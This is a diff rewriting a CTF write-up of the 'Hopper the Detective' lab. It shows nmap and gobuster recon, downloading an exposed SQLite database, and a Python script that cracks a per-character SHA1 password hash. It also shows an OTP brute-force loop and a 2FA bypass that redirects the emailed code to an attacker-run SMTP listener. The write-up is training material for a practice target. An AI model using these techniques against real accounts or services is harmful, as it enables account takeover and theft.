@@ -1,64 +1,34 @@
-# Hopper the Detective — CTF Walkthrough
+# Hopper the Detective — Write-up
 
-## Introduction
+## Objective
 
-**Hopper the Detective** is a CTF-style challenge where the goal is to compromise Sir BreachBlocker's phone, bypass authentication mechanisms, and recover the final key required to release the stolen AoC charity funds.
+Sir BreachBlocker has been captured, but the final key needed to recover the stolen AoC charity funds is hidden somewhere on his phone. Hopper must compromise the device, bypass the authentication layers, and recover the final key before King Malhare's cronies move the funds.
 
-The challenge involves:
+The challenge involves discovering three flags:
 
-- Web enumeration
-- Source code analysis
-- Database extraction
-- Custom password hash reversing
-- Authentication bypass
-- SMTP interception
+- **CODE_FLAG**
+- **HOPFLIX_FLAG**
+- **BANK_FLAG**
 
 ---
 
-# Reconnaissance
-
-I started with an Nmap scan:
+## Initial Recon
 
 ```bash
 nmap -sS -sV -sC --append-output 10.81.152.140
 ```
 
-Results:
-
 ```
-PORT     STATE SERVICE  VERSION
-22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu
-25/tcp   open  smtp     Postfix smtpd
-8443/tcp open  ssl/http nginx 1.29.3
+22/tcp    open  ssh
+25/tcp    open  smtp
+8443/tcp  open  https (nginx)
 ```
 
-The main target was the HTTPS application:
-
-```
-https://10.81.152.140:8443
-```
-
-The page title was:
-
-```
-Mobile Portal
-```
-
----
-
-# Web Enumeration
-
-I enumerated the website using Gobuster:
+The interesting service was the web application running on port `8443`.
 
 ```bash
-gobuster dir \
--w raft-medium-words.txt \
--u https://10.80.178.75:8443 \
--x php,html,txt,py,js \
--k
+gobuster dir -w raft-medium-words.txt -u https://10.80.178.75:8443 -x php,html,txt,py,js -k
 ```
-
-Discovered files:
 
 ```
 /index.html
@@ -67,245 +37,189 @@ Discovered files:
 /requirements.txt
 ```
 
-The exposed source code became the main attack vector.
-
 ---
 
-# Source Code Analysis
+## Web Enumeration
 
-Inside `main.js`, I found sensitive information:
+The JavaScript file (`main.js`) immediately stood out because it contained useful information:
 
 ```javascript
 const PHONE_PASSCODE = "210701";
 
 document.getElementById('streamingEmail').value =
 'sbreachblocker@easterbunnies.thm';
-```
 
-The API routes were also exposed:
-
-```
 POST /api/check-credentials
-
-GET /api/get-last-viewed
+GET  /api/get-last-viewed
 
 POST /api/bank-login
-
 POST /api/send-2fa
-
 POST /api/verify-2fa
-
 POST /api/release-funds
 ```
 
-This revealed the authentication workflow.
+The exposed phone passcode was:
+
+**Passcode:** `210701`
 
 ---
 
-# CODE_FLAG
+## Finding the CODE_FLAG
 
-While reviewing `main.py`, I discovered the first flag stored directly in the source code:
+Inspecting `main.py` revealed the first flag:
 
-```
-THM{eggsposed_********_code}
-```
+**Flag:** `THM{eggs######_code}`
 
----
-
-# Extracting the Hopflix Database
-
-The source code revealed a database:
-
-```
-hopflix-874297.db
-```
-
-I downloaded it:
+Inside the source code, I also found a downloadable Hopflix database, retrieved with:
 
 ```bash
 curl -k -O https://10.80.178.75:8443/hopflix-874297.db
 ```
 
-Opened it:
+Opening it with SQLite:
 
 ```bash
 sqlite3 hopflix-874297.db
 ```
 
-Listed tables:
-
 ```sql
 .tables
 ```
-
-Output:
 
 ```
 users
 ```
 
-Query:
-
 ```sql
 SELECT * FROM users;
 ```
 
-Output:
-
 ```
-sbreachblocker@easterbunnies.thm
-Sir BreachBlocker
-03c96ceff1a9758a1ea7c3cb8d432646...
+sbreachblocker@easterbunnies.thm | Sir BreachBlocker | 03c96ceff1a9758a1ea7c3cb8d432646...
 ```
 
-The password was stored using a custom hashing method.
+The password hash was stored using a custom hashing method.
 
 ---
 
-# Cracking the Hopflix Password
+## Cracking the Hopflix Password
 
-The password validation function showed:
+Looking through the source code revealed that the password was hashed character-by-character:
 
 ```python
 for ch in pwd:
-
     ch_hash = hopper_hash(ch)
 
     if ch_hash != phash[:40]:
-        return jsonify({
-            'valid':False,
-            'error':'Incorrect Password'
-        })
+        return jsonify({'valid':False,
+        'error':'Incorrect Password'})
 
     phash = phash[40:]
 ```
 
-The important discovery was that each character was hashed individually.
+Each character was individually hashed using SHA1, repeated 1000 times. I wrote a script to reverse each character:
 
-The hash format was:
+```python
+import hashlib
 
+hash = "03c96ceff1a9758a1ea7c3cb8d432646..."
+
+characters = (
+    "qwertyuiopasdfghjklzxcvbnm"
+    "QWERTYUIOPASDFGHJKLZXCVBNM"
+    "!@#$*_-"
+)
+
+def decode(value):
+    result = value
+
+    for _ in range(1000):
+        result = hashlib.sha1(
+            result.encode()
+        ).hexdigest()
+
+    return result
+
+
+for i in range(0, len(hash), 40):
+    char_hash = hash[i:i+40]
+
+    for char in characters:
+        if decode(char) == char_hash:
+            print(char, end="")
+
+print()
 ```
-character
-    |
-    v
-SHA1 repeated 1000 times
-    |
-    v
-40 character hash
-```
 
-Each character could be recovered independently.
+This recovered the Hopflix password:
 
-I wrote a script to compare possible characters against the stored hashes.
+**Password:** `malharerocks`
 
-The recovered password was:
+Logging into Hopflix revealed the next flag:
 
-```
-malharerocks
-```
+**Flag:** `THM{fluffier_th######_4}`
 
 ---
 
-# HOPFLIX_FLAG
+## Attacking the Bank Authentication
 
-After logging into Hopflix with the recovered password, the next flag was displayed:
-
-```
-THM{fluffier_********_season_*}
-```
-
----
-
-# Banking Application
-
-Using the same credentials, I accessed the Hopsec bank application.
-
-The login required two-factor authentication.
-
-The interesting endpoints were:
+Using the same credentials on the Hopsec banking application brought me to a two-factor authentication page. The API endpoints discovered earlier were useful:
 
 ```
 POST /api/send-2fa
-
 POST /api/verify-2fa
+POST /api/release-funds
 ```
 
----
-
-# Attempting 2FA Brute Force
-
-I initially attempted to brute-force the six-digit OTP:
+Initially, I attempted to brute force the OTP:
 
 ```python
-for i in range(100000,1000000):
+for i in range(100000, 1000000):
+    otp = f"{i:06d}"
 ```
 
-However, this was too slow and was not the intended solution.
+However, this was extremely slow and appeared to be the wrong approach.
 
 ---
 
-# SMTP 2FA Bypass
+## Intercepting the 2FA Code
 
-The machine exposed an SMTP service:
-
-```
-25/tcp open smtp
-```
-
-Instead of brute forcing the OTP, I started an SMTP listener:
+Looking deeper into the application, I noticed that the OTP was being sent through email. Instead of brute forcing the code, I set up an SMTP listener:
 
 ```bash
 sudo python3 -m aiosmtpd -n -l 0.0.0.0:25
 ```
 
-I then changed the email destination for the 2FA code to:
+Then, during the 2FA setup, I changed the email address to point to my attacking machine:
 
 ```
-attacker@[ATTACKING_IP]@easterbunnies.thm
+attacker@[ATTACKING_IP].easterbunnies.thm
 ```
 
-The application sent the OTP directly to my SMTP listener.
-
-After entering the intercepted code, authentication was successful.
+When the application generated the OTP, it was sent directly to my SMTP listener. This revealed the valid 2FA code, allowing me to authenticate successfully.
 
 ---
 
-# BANK_FLAG
+## Recovering the BANK_FLAG
 
-After successfully logging in and releasing the funds, the final flag was revealed:
+After completing authentication, I was able to access the final endpoint:
 
 ```
-THM{********_balance}
+POST /api/release-funds
 ```
+
+**Flag:** `THM{neg######e}`
 
 ---
 
-# Final Answers
+## Summary
 
-| Question | Answer |
-|---|---|
-| CODE_FLAG | `THM{eggsposed_********_code}` |
-| HOPFLIX_FLAG | `THM{fluffier_********_season_*}` |
-| BANK_FLAG | `THM{********_balance}` |
+- **Recon:** Nmap revealed SSH, SMTP, and an HTTPS web app on port 8443. Gobuster uncovered exposed source files (`main.py`, `main.js`) alongside the site itself.
+- **Source leak:** The exposed `main.js` file leaked a hardcoded phone passcode, a target email address, and the full API surface (`CODE_FLAG`).
+- **Hopflix DB:** `main.py` referenced a downloadable SQLite database containing a custom, character-by-character SHA1 hash of the Hopflix password.
+- **Cracking the hash:** Because each character was hashed independently rather than as a whole string, the password could be brute-forced one character at a time, recovering `malharerocks` and the `HOPFLIX_FLAG`.
+- **Bank login → 2FA:** The same credentials worked on the banking app, which then required a one-time passcode. Straight brute-forcing the OTP was impractical.
+- **2FA bypass:** The OTP was delivered by email to an attacker-controllable address. Standing up a rogue SMTP listener and redirecting the OTP there captured the code directly, bypassing the second factor entirely.
+- **Funds released:** With the OTP in hand, `/api/release-funds` was reachable, yielding the final `BANK_FLAG`.
 
----
-
-# Attack Chain Summary
-
-1. Enumerate services with Nmap.
-2. Discover the Mobile Portal.
-3. Find exposed source code.
-4. Extract API routes and database information.
-5. Download and analyze the Hopflix SQLite database.
-6. Reverse the custom password hashing scheme.
-7. Login to Hopflix and retrieve the hidden flag.
-8. Abuse SMTP to intercept the 2FA code.
-9. Bypass bank authentication.
-10. Release the funds and retrieve the final flag.
-
-This challenge highlights the risks of:
-
-- Exposed source code
-- Weak custom cryptographic implementations
-- Poor authentication design
-- Insecure email-based 2FA systems
+**Key takeaways:** the box relied on leaked client-side source code, a homegrown cryptographic scheme that could be attacked piecemeal, and an OTP delivery channel that trusted attacker-supplied input — none of which required exotic exploits, just careful enumeration and reading the client-side code closely.
